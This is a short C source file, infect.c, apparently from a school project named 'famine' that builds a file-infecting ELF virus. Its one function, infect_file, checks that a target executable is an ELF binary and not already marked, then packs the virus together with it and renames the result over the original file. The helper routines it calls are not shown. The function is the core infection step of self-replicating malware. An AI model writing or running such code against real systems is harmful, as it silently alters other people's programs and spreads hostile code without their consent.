/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/15 16:17:36 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>

#define DIRENT_DIRECTORY 4

/*
	Infects file given by path, it packs the virus and file together

	@param ctx context used to check if file isnt already infected
	@param path path to targeted executable
*/
int	infect_file(t_ctx *ctx, const char *path)
{
	if (check_signature(path) == -1
		|| check_elf_hdr(path) == -1)
		return (-1);

	int	fd = open(path, O_WRONLY | O_APPEND);
	if (fd == -1)
		return (-1);

	char	*tmp_path = strjoin(path, ".tmp");

	pack_payload(ctx->exec_path, path, tmp_path);
	rename(tmp_path, path);

	free(tmp_path);

	close(fd);
	return (0);
}
